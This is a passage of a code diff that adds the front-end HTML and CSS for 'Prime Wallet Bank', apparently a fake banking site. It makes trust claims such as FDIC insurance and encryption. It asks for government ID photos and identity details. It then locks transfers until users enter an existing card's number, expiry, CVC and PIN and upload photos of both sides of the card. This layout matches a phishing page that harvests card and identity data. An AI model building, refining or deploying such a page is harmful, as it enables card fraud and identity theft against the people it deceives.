@@ -1,0 +1,1909 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Prime Wallet Bank â€” Secure Global Banking">
+  <meta name="theme-color" content="#0047AB">
+  <title>Prime Wallet Bank â€” USA ðŸ‡ºðŸ‡¸ | Secure Global Banking</title>
+  <style>
+    :root{
+      --pri:#0047AB; --pri-hover:#003380; --pri-light:#2563EB;
+      --gold:#B8860B; --gold-light:#F59E0B;
+      --success:#059669; --success-bg:#ECFDF5;
+      --error:#DC2626; --error-bg:#FEE2E2;
+      --warn:#F59E0B; --warn-bg:#FFFBEB;
+      --white:#FFFFFF; --bg:#F8FAFC; --card:#FFFFFF;
+      --text-dark:#1E293B; --text-muted:#64748B; --border:#E2E8F0;
+      --shadow-sm:0 1px 3px rgba(0,0,0,.05);
+      --shadow-md:0 4px 12px rgba(0,0,0,.08);
+      --shadow-lg:0 8px 30px rgba(0,0,0,.12);
+      --radius-sm:8px; --radius-md:12px; --radius-lg:20px;
+    }
+    *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Roboto,'Helvetica Neue',sans-serif}
+    body{background:linear-gradient(180deg, #F8FAFC 0%, #EFF6FF 100%);color:var(--text-dark);line-height:1.6;min-height:100vh}
+    .hidden{display:none !important}
+    button{cursor:pointer;border:none;border-radius:var(--radius-sm);font-weight:600;transition:all .2s ease}
+    input,select,textarea{border:2px solid var(--border);border-radius:var(--radius-sm);padding:14px 16px;font-size:15px;outline:none;width:100%;margin-bottom:14px;background:var(--white);transition:border-color .2s,box-shadow .2s}
+    input:focus,select:focus,textarea:focus{border-color:var(--pri);box-shadow:0 0 0 3px rgba(0,71,171,.1)}
+    label{font-weight:600;color:#001F3F;margin-bottom:8px;display:block;margin-top:18px;font-size:14px}
+    .page{min-height:100vh;padding-bottom:90px}
+    .container{max-width:480px;margin:0 auto;padding:20px}
+    .full-container{max-width:1200px;margin:0 auto;padding:20px}
+    .btn-primary{background:linear-gradient(135deg,var(--pri),var(--pri-hover));color:var(--white);padding:15px 24px;font-size:16px;width:100%;box-shadow:0 4px 12px rgba(0,71,171,.2)}
+    .btn-primary:hover{transform:translateY(-1px);box-shadow:0 6px 16px rgba(0,71,171,.25)}
+    .btn-secondary{background:var(--white);color:var(--pri);border:2px solid var(--pri);padding:13px 20px;font-size:15px}
+    .btn-secondary:hover{background:rgba(0,71,171,.03)}
+    .btn-success{background:var(--success);color:white;padding:13px 20px}
+    .btn-outline{background:transparent;border:2px solid var(--border);color:#001F3F;padding:13px 20px;width:100%;text-align:left;display:flex;align-items:center;gap:10px}
+    .btn-outline:hover{border-color:var(--pri);color:var(--pri);background:rgba(0,71,171,.02)}
+    .card{background:var(--white);border-radius:var(--radius-md);padding:28px;box-shadow:var(--shadow-md);border:1px solid rgba(226,232,240,.8);margin-bottom:20px}
+    .card-title{font-size:24px;font-weight:800;color:var(--pri);margin-bottom:6px}
+    .card-subtitle{color:var(--text-muted);margin-bottom:24px;font-size:14px}
+    .landing-hero{background:linear-gradient(135deg,var(--pri) 0%,#0052CC 50%,var(--pri-hover) 100%);color:white;text-align:center;padding:60px 24px 90px;border-radius:0 0 var(--radius-lg) var(--radius-lg);position:relative;overflow:hidden}
+    .landing-hero::before{content:'';position:absolute;top:-50px;right:-50px;width:200px;height:200px;background:rgba(255,255,255,.05);border-radius:50%}
+    .landing-hero::after{content:'';position:absolute;bottom:-30px;left:-30px;width:150px;height:150px;background:rgba(255,255,255,.05);border-radius:50%}
+    .landing-hero h1{font-size:34px;margin-bottom:12px;position:relative;z-index:1}
+    .landing-hero p{font-size:17px;opacity:.92;max-width:360px;margin:0 auto;position:relative;z-index:1}
+    .trust-badges{display:flex;justify-content:center;gap:16px;margin-top:20px;flex-wrap:wrap}
+    .trust-badge{background:rgba(255,255,255,.15);padding:8px 14px;border-radius:20px;font-size:12px;font-weight:600}
+    .tab-row{display:flex;gap:12px;margin-bottom:28px}
+    .tab{flex:1;padding:14px;border-radius:var(--radius-sm);text-align:center;font-weight:700;border:2px solid var(--border);cursor:pointer;transition:all .2s;background:var(--white)}
+    .tab.active{border-color:var(--pri);background:var(--pri);color:white;box-shadow:0 2px 8px rgba(0,71,171,.2)}
+    .input-group{position:relative;margin-bottom:14px}
+    .input-group input,.input-group select{margin-bottom:0}
+    .eye-icon{position:absolute;right:16px;top:38px;transform:translateY(-50%);cursor:pointer;font-size:22px;user-select:none;opacity:.7;transition:opacity .2s}
+    .eye-icon:hover{opacity:1}
+    .balance-card{background:linear-gradient(135deg,var(--pri) 0%,#0052CC 100%);color:white;border-radius:var(--radius-md);padding:28px;margin-bottom:24px;box-shadow:0 8px 24px rgba(0,71,171,.25);position:relative;overflow:hidden}
+    .balance-label{font-size:15px;opacity:.85;margin-bottom:6px}
+    .balance-amount{font-size:40px;font-weight:800;letter-spacing:-0.5px}
+    .account-id{font-size:14px;opacity:.85;margin-top:10px;font-family:monospace;letter-spacing:1px}
+    .status-badge{display:inline-block;padding:7px 14px;border-radius:20px;font-size:13px;font-weight:700;margin-top:12px}
+    .status-pending{background:var(--warn-bg);color:#92400E;border:1px solid var(--gold)}
+    .status-approved{background:var(--success-bg);color:#065F46;border:1px solid #6EE7B7}
+    .status-locked{background:#FEE2E2;color:#991B1B;border:1px solid #FECACA}
+    .quick-actions{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin:28px 0}
+    .qa-btn{display:flex;flex-direction:column;align-items:center;gap:8px;padding:20px 12px;background:var(--white);border:2px solid var(--border);border-radius:var(--radius-sm);font-size:13px;font-weight:600;color:#001F3F;transition:all .2s}
+    .qa-btn:hover{border-color:var(--pri);background:rgba(0,71,171,.03);transform:translateY(-2px)}
+    .qa-btn.locked{opacity:.55;border-style:dashed;cursor:not-allowed;transform:none}
+    .qa-btn.locked:hover{border-color:var(--border);background:transparent}
+    .nav-bottom{position:fixed;bottom:0;left:0;right:0;background:rgba(255,255,255,.95);backdrop-filter:blur(12px);border-top:1px solid rgba(226,232,240,.8);display:flex;justify-content:space-around;padding:10px 0;z-index:99;box-shadow:0 -2px 10px rgba(0,0,0,.05)}
+    .nav-item{display:flex;flex-direction:column;align-items:center;gap:3px;font-size:11px;color:#001F3F;opacity:.6;transition:all .2s}
+    .nav-item.active{opacity:1;color:var(--pri);font-weight:700}
+    .nav-icon{font-size:24px}
+    .header-bar{background:rgba(255,255,255,.95);backdrop-filter:blur(12px);border-bottom:1px solid rgba(226,232,240,.8);padding:16px 20px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:50}
+    .header-title{font-size:20px;font-weight:800;color:var(--pri)}
+    .back-btn{font-size:26px;color:var(--pri);cursor:pointer;padding-right:10px;font-weight:700}
+    .file-upload{border:2px dashed var(--border);border-radius:var(--radius-sm);padding:24px;text-align:center;cursor:pointer;margin-bottom:14px;transition:all .2s}
+    .file-upload:hover{border-color:var(--pri);background:rgba(0,71,171,.02)}
+    .file-name{font-size:13px;color:var(--pri);margin-top:8px;font-weight:500}
+    .alert-box{padding:16px;border-radius:var(--radius-sm);margin:18px 0;font-weight:500;line-height:1.5}
+    .alert-info{background:#E6F2FF;color:#0047AB;border-left:4px solid var(--pri)}
+    .alert-warning{background:var(--warn-bg);color:#92400E;border-left:4px solid var(--gold)}
+    .alert-success{background:var(--success-bg);color:#065F46;border-left:4px solid var(--success)}
+    .alert-error{background:var(--error-bg);color:#991B1B;border-left:4px solid var(--error)}
+    .lock-banner{background:linear-gradient(135deg,#FEF2C7,#FDE68A);color:#92400E;padding:18px;border-radius:var(--radius-sm);margin-bottom:20px;border:1px solid #F59E0B}
+    .two-col{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+    .three-col{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
+    .text-center{text-align:center}
+    .mt-20{margin-top:20px}
+    .mb-20{margin-bottom:20px}
+    .full-width{width:100%}
+    .text-muted{color:var(--text-muted);font-size:13px}
+    .divider{height:1px;background:var(--border);margin:24px 0}
+    .tag{display:inline-block;padding:4px 10px;border-radius:12px;font-size:11px;font-weight:600}
+    .tag-blue{background:#E6F2FF;color:#0047AB}
+    .tag-gold{background:var(--warn-bg);color:#92400E}
+    .tag-green{background:var(--success-bg);color:#065F46}
+    .tag-red{background:var(--error-bg);color:#991B1B}
+    .input-hint{font-size:12px;color:var(--text-muted);margin-top:-10px;margin-bottom:14px}
+    .dob-row{display:grid;grid-template-columns:2fr 1fr 1fr;gap:12px}
+    .toast{position:fixed;top:20px;left:50%;transform:translateX(-50%);background:var(--white);padding:14px 24px;border-radius:var(--radius-md);box-shadow:var(--shadow-lg);z-index:9999;max-width:90%;text-align:center}
+    .toast.success{border-left:4px solid var(--success)}
+    .toast.error{border-left:4px solid var(--error)}
+    .toast.pending{border-left:4px solid var(--warn)}
+    @media(max-width:480px){
+      .card{padding:20px}
+      .landing-hero h1{font-size:28px}
+      .balance-amount{font-size:32px}
+      .quick-actions{grid-template-columns:repeat(2,1fr)}
+    }
+  </style>
+</head>
+<body>
+
+<!-- ðŸ”” TOAST NOTIFICATION -->
+<div id="toast" class="toast hidden"></div>
+
+<!-- ============================================== -->
+<!-- ðŸ¦ LANDING PAGE -->
+<!-- ============================================== -->
+<div class="page" id="landingPage">
+  <div class="landing-hero">
+    <h1>ðŸ¦ Prime Wallet Bank</h1>
+    <p>Secure Â· Global Â· Licensed Banking Made For You ðŸ‡ºðŸ‡¸</p>
+    <div class="trust-badges">
+      <span class="trust-badge">ðŸ”’ 256-bit Encryption</span>
+      <span class="trust-badge">ðŸŒ 180+ Countries</span>
+      <span class="trust-badge">âœ… FDIC Insured</span>
+    </div>
+  </div>
+  
+  <div class="container">
+    <div class="tab-row">
+      <button class="tab active" id="tabSignup" onclick="switchTab('signup')">CREATE ACCOUNT</button>
+      <button class="tab" id="tabLogin" onclick="switchTab('login')">SIGN IN</button>
+    </div>
+
+    <!-- SIGNUP FORM -->
+    <div id="signupForm">
+      <div class="card">
+        <h2 class="card-title">Create Your Account</h2>
+        <p class="card-subtitle">Join millions of users worldwide</p>
+
+        <label>ðŸ‘¤ Full Legal Name *</label>
+        <input type="text" id="regFullName" placeholder="John Michael Doe" required>
+
+        <label>ðŸ“§ Email Address *</label>
+        <input type="email" id="regEmail" placeholder="john@example.com" required>
+
+        <label>ðŸ“± Phone Number *</label>
+        <input type="tel" id="regPhone" placeholder="+1 (555) 000-0000" required>
+
+        <label>ðŸŽ‚ Date of Birth *</label>
+        <div class="dob-row">
+          <div>
+            <label style="margin-top:0">Day</label>
+            <select id="regDobDay">
+              <option value="">--</option>
+            </select>
+          </div>
+          <div>
+            <label style="margin-top:0">Month</label>
+            <select id="regDobMonth">
+              <option value="">--</option>
+              <option value="01">Jan</option>
+              <option value="02">Feb</option>
+              <option value="03">Mar</option>
+              <option value="04">Apr</option>
+              <option value="05">May</option>
+              <option value="06">Jun</option>
+              <option value="07">Jul</option>
+              <option value="08">Aug</option>
+              <option value="09">Sep</option>
+              <option value="10">Oct</option>
+              <option value="11">Nov</option>
+              <option value="12">Dec</option>
+            </select>
+          </div>
+          <div>
+            <label style="margin-top:0">Year</label>
+            <select id="regDobYear">
+              <option value="">--</option>
+            </select>
+          </div>
+        </div>
+        <p class="input-hint">Must be 18+ years old to open an account</p>
+
+        <label>ðŸŒ Country of Residence *</label>
+        <select id="regCountry" onchange="loadStates()" required>
+          <option value="">-- Select Your Country --</option>
+          <option value="US">ðŸ‡ºðŸ‡¸ United States</option>
+          <option value="NG">ðŸ‡³ðŸ‡¬ Nigeria</option>
+          <option value="UK">ðŸ‡¬ðŸ‡§ United Kingdom</option>
+          <option value="CA">ðŸ‡¨ðŸ‡¦ Canada</option>
+          <option value="AU">ðŸ‡¦ðŸ‡º Australia</option>
+          <option value="GH">ðŸ‡¬ðŸ‡­ Ghana</option>
+          <option value="KE">ðŸ‡°ðŸ‡ª Kenya</option>
+          <option value="ZA">ðŸ‡¿ðŸ‡¦ South Africa</option>
+          <option value="DE">ðŸ‡©ðŸ‡ª Germany</option>
+          <option value="FR">ðŸ‡«ðŸ‡· France</option>
+          <option value="IN">ðŸ‡®ðŸ‡³ India</option>
+          <option value="AE">ðŸ‡¦ðŸ‡ª UAE</option>
+          <option value="JP">ðŸ‡¯ðŸ‡µ Japan</option>
+          <option value="MX">ðŸ‡²ðŸ‡½ Mexico</option>
+          <option value="OTHER">ðŸŒ Other Country</option>
+        </select>
+
+        <label>ðŸ—ºï¸ State / Province / Region *</label>
+        <select id="regState" onchange="loadCities()" required>
+          <option value="">-- Select Country First --</option>
+        </select>
+
+        <label>ðŸ™ï¸ City / Town *</label>
+        <select id="regCity" required>
+          <option value="">-- Select State First --</option>
+        </select>
+
+        <label>ðŸ”‘ Create Password *</label>
+        <div class="input-group">
+          <input type="password" id="regPass" placeholder="Min 8 characters">
+          <span class="eye-icon" onclick="togglePassword('regPass')">ðŸ‘ï¸</span>
+        </div>
+        <p class="input-hint">Must contain uppercase, lowercase, number & special character</p>
+
+        <label>ðŸ”‘ Confirm Password *</label>
+        <div class="input-group">
+          <input type="password" id="regConfirmPass" placeholder="Repeat password">
+          <span class="eye-icon" onclick="togglePassword('regConfirmPass')">ðŸ‘ï¸</span>
+        </div>
+
+        <div class="divider"></div>
+        <h3 style="font-size:16px;color:var(--pri);margin-bottom:16px">ðŸªª Identity Verification</h3>
+
+        <label>Government ID Type *</label>
+        <select id="idType" required>
+          <option value="">-- Select ID Type --</option>
+          <option value="International Passport">ðŸ“˜ International Passport</option>
+          <option value="Driver's License">ðŸš— Driver's License</option>
+          <option value="National ID Card">ðŸªª National ID Card</option>
+          <option value="Residence Permit">ðŸ  Residence Permit</option>
+        </select>
+
+        <label>ID Number / Document Number *</label>
+        <input type="text" id="idNumber" placeholder="Enter your ID number">
+
+        <label>Upload ID Front Side ðŸ“· *</label>
+        <input type="file" id="idFront" accept="image/*" required>
+        <p class="input-hint">âœ… Clear, color photo â€” no blurry, scanned, or AI-generated images accepted</p>
+
+        <label>Upload ID Back Side ðŸ“· *</label>
+        <input type="file" id="idBack" accept="image/*" required>
+        <p class="input-hint">âœ… Must show all corners & text clearly</p>
+
+        <button class="btn-primary" onclick="submitRegistration()">âœ… Create My Account</button>
+        <p style="font-size:12px;color:var(--text-muted);margin-top:16px;text-align:center">
+          By creating an account, you agree to our Terms of Service & Privacy Policy.<br>
+          All data is encrypted & secured.
+        </p>
+      </div>
+    </div>
+
+    <!-- LOGIN FORM -->
+    <div id="loginForm" class="hidden">
+      <div class="card">
+        <h2 class="card-title">Welcome Back</h2>
+        <p class="card-subtitle">Sign in to your account</p>
+
+        <label>ðŸ“§ Email Address</label>
+        <input type="email" id="loginEmail" placeholder="Enter your email">
+
+        <label>ðŸ”‘ Password</label>
+        <div class="input-group">
+          <input type="password" id="loginPass" placeholder="Enter your password">
+          <span class="eye-icon" onclick="togglePassword('loginPass')">ðŸ‘ï¸</span>
+        </div>
+
+        <p style="text-align:right;margin-bottom:16px">
+          <a style="color:var(--pri);cursor:pointer" onclick="openPage('resetRequestPage')">Forgot Password?</a>
+        </p>
+
+        <button class="btn-primary" onclick="submitLogin()">ðŸ” Sign In</button>
+        <button class="btn-secondary full-width mt-20" onclick="switchTab('signup')">Don't have an account? Create Account</button>
+      </div>
+    </div>
+
+    <!-- PASSWORD RESET REQUEST -->
+    <div id="resetRequestPage" class="hidden">
+      <div class="card">
+        <span style="color:var(--pri);cursor:pointer" onclick="switchTab('login')">â† Back to Sign In</span>
+        <h2 class="card-title mt-20">ðŸ”‘ Forgot Password</h2>
+        <p class="card-subtitle">Recover Your Account</p>
+
+        <label>ðŸ“§ Registered Email Address *</label>
+        <input type="email" id="recoveryEmail" placeholder="Enter your email">
+
+        <label>Full Legal Name (as registered) *</label>
+        <input type="text" id="recoveryFullName" placeholder="Your full name">
+
+        <label>Phone Number (as registered) *</label>
+        <input type="tel" id="recoveryPhone" placeholder="Your phone number">
+
+        <label>Date of Birth *</label>
+        <input type="date" id="recoveryDob">
+
+        <label>Country of Residence *</label>
+        <select id="recoveryCountry">
+          <option value="">-- Select Country --</option>
+          <option value="US">ðŸ‡ºðŸ‡¸ United States</option>
+          <option value="NG">ðŸ‡³ðŸ‡¬ Nigeria</option>
+          <option value="UK">ðŸ‡¬ðŸ‡§ United Kingdom</option>
+          <option value="CA">ðŸ‡¨ðŸ‡¦ Canada</option>
+          <option value="OTHER">ðŸŒ Other</option>
+        </select>
+
+        <label>Government ID Number *</label>
+        <input type="text" id="recoveryIdNumber" placeholder="ID number used during registration">
+
+        <label>ðŸ“· Upload ID Front (for verification) *</label>
+        <input type="file" id="recoveryIdFront" accept="image/*">
+
+        <label>ðŸ“· Upload ID Back (for verification) *</label>
+        <input type="file" id="recoveryIdBack" accept="image/*">
+
+        <label>âœï¸ Requested New Password *</label>
+        <div class="input-group">
+          <input type="password" id="recoveryNewPass" placeholder="Min 8 characters">
+          <span class="eye-icon" onclick="togglePassword('recoveryNewPass')">ðŸ‘ï¸</span>
+        </div>
+
+        <label>Confirm New Password *</label>
+        <div class="input-group">
+          <input type="password" id="recoveryConfirmPass" placeholder="Repeat new password">
+          <span class="eye-icon" onclick="togglePassword('recoveryConfirmPass')">ðŸ‘ï¸</span>
+        </div>
+
+        <button class="btn-primary" onclick="submitPasswordResetRequest()">ðŸ“¤ Submit Reset Request</button>
+        <p style="font-size:12px;color:var(--text-muted);margin-top:12px;text-align:center">
+          â³ Your request will be reviewed by our admin team within 24 hours.<br>
+          Password will NOT change until approved.
+        </p>
+      </div>
+    </div>
+
+    <p style="text-align:center;margin-top:40px;font-size:13px;color:var(--text-muted)">
+      Â© 2026 Prime Wallet Bank - USA. All rights reserved.<br>
+      Secure Â· Licensed Â· FDIC Insured Â· Global Services<br>
+      Contact: support@primewalletbankusa.com
+    </p>
+  </div>
+</div>
+
+<!-- ============================================== -->
+<!-- ðŸ“Š DASHBOARD PAGE -->
+<!-- ============================================== -->
+<div class="page hidden" id="dashboardPage">
+  <div class="header-bar">
+    <span class="header-title">ðŸ¦ Dashboard</span>
+    <span style="font-size:24px">ðŸ‘¤</span>
+  </div>
+
+  <div class="container" style="padding-bottom:100px">
+    <div class="balance-card">
+      <p class="balance-label">Available Balance</p>
+      <p class="balance-amount">$<span id="userBalance">0.00</span></p>
+      <p class="account-id">Account: <span id="userAccount">â€”</span></p>
+      <span id="accountStatus" class="status-badge status-pending">â³ Account Under Review</span>
+    </div>
+
+    <div id="transactionLockBanner" class="lock-banner">
+      <p style="font-weight:700;margin-bottom:8px">ðŸ”’ Transactions Temporarily Locked</p>
+      <p>To send money, pay bills, and unlock full banking features â€” please purchase and verify your Prime Wallet Bank ATM Card first.</p>
+      <button class="btn-primary mt-20" onclick="openPage('cardPage')" style="width:auto">ðŸ’³ Get Prime Wallet Card</button>
+    </div>
+
+    <div class="alert-box alert-info" id="approvalNote">
+      â³ Your account is under review. Full features activate once approved by our admin team.
+    </div>
+
+    <h3 style="margin:28px 0 12px">âš¡ Quick Actions</h3>
+    <div class="quick-actions">
+      <button class="qa-btn" onclick="openPage('depositPage')">
+        <span style="font-size:24px">ðŸ’°</span> Deposit
+      </button>
+      <button class="qa-btn locked" id="qaSendMoney" onclick="checkCardThenOpen('transferPage')">
+        <span style="font-size:24px">â†—ï¸</span> Send Money
+      </button>
+      <button class="qa-btn" onclick="openPage('cardPage')">
+        <span style="font-size:24px">ðŸ’³</span> Get Card
+      </button>
+      <button class="qa-btn locked" id="qaPayBills" onclick="checkCardThenOpen('billsPage')">
+        <span style="font-size:24px">ðŸ“„</span> Pay Bills
+      </button>
+      <button class="qa-btn" onclick="openPage('historyPage')">
+        <span style="font-size:24px">ðŸ“Š</span> History
+      </button>
+      <button class="qa-btn" onclick="openPage('profilePage')">
+        <span style="font-size:24px">ðŸ‘¤</span> Profile
+      </button>
+    </div>
+
+    <h3 style="margin:32px 0 16px">ðŸ¦ All Banking Services</h3>
+    <div style="display:grid;gap:12px">
+      <button class="btn-outline" onclick="openPage('messagesPage')">ðŸ’¬ Messages & Notifications</button>
+      <button class="btn-outline" onclick="openPage('cardsPage')">ðŸ’³ My Cards & Limits</button>
+      <button class="btn-outline" onclick="openPage('checkingPage')">ðŸ¦ Checking Account</button>
+      <button class="btn-outline" onclick="openPage('savingsPage')">ðŸ’° Savings & CDs â€” Up to 5.25% APY</button>
+      <button class="btn-outline" onclick="openPage('loansPage')">ðŸ  Loans & Mortgages</button>
+      <button class="btn-outline" onclick="openPage('investPage')">ðŸ“ˆ Investments & Crypto</button>
+      <button class="btn-outline" onclick="openPage('settingsPage')">âš™ï¸ Security & Settings</button>
+      <button class="btn-outline" onclick="openPage('supportPage')">ðŸŽ§ Support & Help Center</button>
+    </div>
+  </div>
+
+  <!-- Bottom Navigation -->
+  <div class="nav-bottom">
+    <div class="nav-item active" onclick="openPage('dashboardPage')">
+      <span class="nav-icon">ðŸ </span> Home
+    </div>
+    <div class="nav-item" onclick="checkCardThenOpen('transferPage')">
+      <span class="nav-icon">â†—ï¸</span> Transfer
+    </div>
+    <div class="nav-item" onclick="openPage('cardPage')">
+      <span class="nav-icon">ðŸ’³</span> Cards
+    </div>
+    <div class="nav-item" onclick="openPage('morePage')">
+      <span class="nav-icon">â˜°</span> More
+    </div>
+  </div>
+</div>
+
+<!-- ============================================== -->
+<!-- ðŸ’° DEPOSIT PAGE -->
+<!-- ============================================== -->
+<div class="page hidden" id="depositPage">
+  <div class="header-bar">
+    <span class="back-btn" onclick="openPage('dashboardPage')">â†</span>
+    <span class="header-title">ðŸ’° Deposit Funds</span>
+    <span></span>
+  </div>
+  <div class="container">
+    <div class="card">
+      <h3 class="card-title">Amount (USD)</h3>
+      <input type="number" id="depositAmount" placeholder="0.00" step="1" min="1">
+
+      <label>Deposit Method</label>
+      <select id="depositMethod">
+        <option value="">-- Select Payment Method --</option>
+        <option value="Bank Transfer">ðŸ¦ Bank Transfer (ACH / Wire)</option>
+        <option value="Card">ðŸ’³ Debit / Credit Card â€” Visa, MasterCard, Verve</option>
+        <option value="Crypto">â‚¿ Cryptocurrency â€” BTC, ETH, USDT, SOL</option>
+        <option value="Mobile Money">ðŸ“± Mobile Money â€” M-Pesa, Opay, Palmpay</option>
+      </select>
+
+      <label>Reference / Note (Optional)</label>
+      <input type="text" id="depositNote" placeholder="Add reference...">
+
+      <p class="input-hint">â±ï¸ Bank transfers: 1â€“3 business days. Card deposits: Instant. Crypto: 1 confirmation.</p>
+
+      <button class="btn-primary" onclick="submitDeposit()">âœ… Submit Deposit Request</button>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================== -->
+<!-- ðŸ’³ GET CARD PAGE -->
+<!-- ============================================== -->
+<div class="page hidden" id="cardPage">
+  <div class="header-bar">
+    <span class="back-btn" onclick="openPage('dashboardPage')">â†</span>
+    <span class="header-title">ðŸ’³ Prime Wallet Bank ATM Card</span>
+    <span></span>
+  </div>
+  <div class="container">
+    <div class="card">
+      <h3 class="card-title">âœ¨ Unlock Full Banking Power!</h3>
+      <p class="card-subtitle">Get your Prime Wallet Card to send money, pay bills, and enjoy unlimited global transfers.</p>
+
+      <div class="alert-box alert-warning">
+        âš ï¸ <strong>Image Requirements â€” Strictly Enforced:</strong><br>
+        âœ… Real color photo â€” no screenshots, no scans<br>
+        âœ… All 4 corners visible â€” no cropped images<br>
+        âœ… No blurry, dark, or edited photos<br>
+        âœ… No AI-generated or digitally altered images<br>
+        âœ… Expiry date must be clearly visible â€” not expired<br>
+        âŒ Expired cards will be rejected automatically
+      </div>
+
+      <label>Card Network / Type</label>
+      <select id="cardType">
+        <option value="">-- Select Card Network --</option>
+        <option value="visa">ðŸ’³ Visa â€” Global Acceptance</option>
+        <option value="mastercard">ðŸ’³ MasterCard â€” Worldwide</option>
+        <option value="verve">ðŸ’³ Verve â€” Africa & Global</option>
+        <option value="amex">ðŸ’³ American Express</option>
+      </select>
+
+      <label>Cardholder Full Name (As on Card)</label>
+      <input type="text" id="atmHolder" placeholder="Must match government ID exactly">
+
+      <label>Card Number (16 Digits)</label>
+      <input type="text" id="atmNumber" placeholder="XXXX XXXX XXXX XXXX" oninput="formatCardNumber(this)">
+
+      <label>Expiry Date</label>
+      <input type="text" id="atmExpiry" placeholder="MM / YY" oninput="formatExpiry(this)">
+      <p class="input-hint">Not expired</p>
+
+      <label>CVC / CVV</label>
+      <input type="text" id="atmCvc" placeholder="123" maxlength="4">
+
+      <label>4-Digit Transaction PIN</label>
+      <div class="input-group">
+        <input type="password" id="atmPin" maxlength="4" inputmode="numeric" placeholder="****">
+        <span class="eye-icon" onclick="togglePassword('atmPin')">ðŸ‘ï¸</span>
+      </div>
+      <p class="input-hint">For all future transfers & payments</p>
+
+      <label>Upload Card Front ðŸ“·</label>
+      <input type="file" id="atmFront" accept="image/*">
+      <p class="input-hint">âœ… Show card number, name, expiry clearly</p>
+
+      <label>Upload Card Back ðŸ“·</label>
+      <input type="file" id="atmBack" accept="image/*">
+      <p class="input-hint">âœ… Must show signature strip & CVC</p>
+
+      <button class="btn-primary" onclick="submitCard()">âœ… Submit for Approval</button>
+      <p class="input-hint text-center">â³ Review takes 1â€“24 hours. You'll be notified once approved.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================== -->
+<!-- â†—ï¸ SEND MONEY PAGE -->
+<!-- ============================================== -->
+<div class="page hidden" id="transferPage">
+  <div class="header-bar">
+    <span class="back-btn" onclick="openPage('dashboardPage')">â†</span>
+    <span class="header-title">â†—ï¸ Send Money</span>
+    <span></span>
+  </div>
+  <div class="container">
+    <div id="transferLockNotice" class="lock-banner">
+      <p style="font-weight:700">ðŸ”’ Feature Locked</p>
+      <p>Purchase & get approved for your Prime Wallet Card to unlock transfers.</p>
+      <button class="btn-primary mt-20" onclick="openPage('cardPage')" style="width:auto">Get Card Now</button>
+    </div>
+
+    <div id="transferForm" class="hidden">
+      <div class="card">
+        <label>Recipient Country</label>
+        <select id="recipientCountry" onchange="loadRecipientBanks()">
+          <option value="">-- Select Country --</option>
+          <option value="US">ðŸ‡ºðŸ‡¸ United States</option>
+          <option value="NG">ðŸ‡³ðŸ‡¬ Nigeria</option>
+          <option value="UK">ðŸ‡¬ðŸ‡§ United Kingdom</option>
+          <option value="CA">ðŸ‡¨ðŸ‡¦ Canada</option>
+          <option value="KE">ðŸ‡°ðŸ‡ª Kenya</option>
+          <option value="GH">ðŸ‡¬ðŸ‡­ Ghana</option>
+          <option value="OTHER">ðŸŒ Other Country</option>
+        </select>
+
+        <label>Recipient Bank / Financial Institution</label>
+        <select id="recipientBank">
+          <option value="">-- Select Country First --</option>
+        </select>
+
+        <label>Account Number / Wallet ID</label>
+        <input type="text" id="recipientAccount" placeholder="Enter account number">
+
+        <button class="btn-secondary full-width" onclick="verifyAccount()">ðŸ” Verify Account Name Before Sending</button>
+        <div id="accountNameResult" class="alert-box alert-info hidden">
+          âœ… Verified Account Name: <span id="verifiedName">â€”</span>
+        </div>
+
+        <label>Amount to Send (USD)</label>
+        <input type="number" id="transferAmount" placeholder="0.00" step="1" min="1">
+        <p class="input-hint">Available Balance: $<span id="availBalance">0.00</span></p>
+
+        <label>Remark / Reference (Optional)</label>
+        <input type="text" id="transferNote" placeholder="Add note...">
+
+        <label>Confirm 4-Digit PIN</label>
+        <div class="input-group">
+          <input type="password" id="transferPin" maxlength="4" inputmode="numeric" placeholder="****">
+          <span class="eye-icon" onclick="togglePassword('transferPin')">ðŸ‘ï¸</span>
+        </div>
+
+        <button class="btn-primary mt-20" onclick="submitTransfer()">âœ… Send Money Now</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================== -->
+<!-- ðŸ“„ PAY BILLS PAGE -->
+<!-- ============================================== -->
+<div class="page hidden" id="billsPage">
+  <div class="header-bar">
+    <span class="back-btn" onclick="openPage('dashboardPage')">â†</span>
+    <span class="header-title">ðŸ“„ Pay Bills</span>
+    <span></span>
+  </div>
+  <div class="container">
+    <div id="billsLockNotice" class="lock-banner">
+      <p style="font-weight:700">ðŸ”’ Feature Locked</p>
+      <p>Get your Prime Wallet Card approved to unlock bill payments.</p>
+      <button class="btn-primary mt-20" onclick="openPage('cardPage')" style="width:auto">Get Card</button>
+    </div>
+
+    <div id="billsForm" class="hidden">
+      <div class="card">
+        <label>Bill Category</label>
+        <select id="billCategory">
+          <option value="">-- Select Category --</option>
+          <option value="Electricity">âš¡ Electricity / Power</option>
+          <option value="Water">ðŸ’§ Water & Sewage</option>
+          <option value="Internet">ðŸ“¶ Internet & Data</option>
+          <option value="TV">ðŸ“º TV & Streaming Subscriptions</option>
+          <option value="Airtime">ðŸ“± Mobile Airtime & Top-up</option>
+          <option value="Rent">ðŸ  Rent & Utilities</option>
+          <option value="Government">ðŸ›ï¸ Government & Taxes</option>
+          <option value="Education">ðŸŽ“ Education & School Fees</option>
+          <option value="Health">ðŸ¥ Healthcare & Insurance</option>
+          <option value="Transport">ðŸš— Transport & Toll</option>
+          <option value="Other">Other</option>
+        </select>
+
+        <label>Service Provider</label>
+        <input type="text" id="billProvider" placeholder="Enter provider name">
+
+        <label>Account / Meter / Reference Number</label>
+        <input type="text" id="billAccount" placeholder="Enter reference number">
+
+        <label>Amount (USD)</label>
+        <input type="number" id="billAmount" placeholder="0.00" step="1" min="1">
+
+        <label>Confirm 4-Digit PIN</label>
+        <div class="input-group">
+          <input type="password" id="billPin" maxlength="4" inputmode="numeric" placeholder="****">
+          <span class="eye-icon" onclick="togglePassword('billPin')">ðŸ‘ï¸</span>
+        </div>
+
+        <button class="btn-primary mt-20" onclick="submitBillPayment()">âœ… Pay Bill Now</button>
+      </div>
+    </div>
+  </div>
+</div>
+
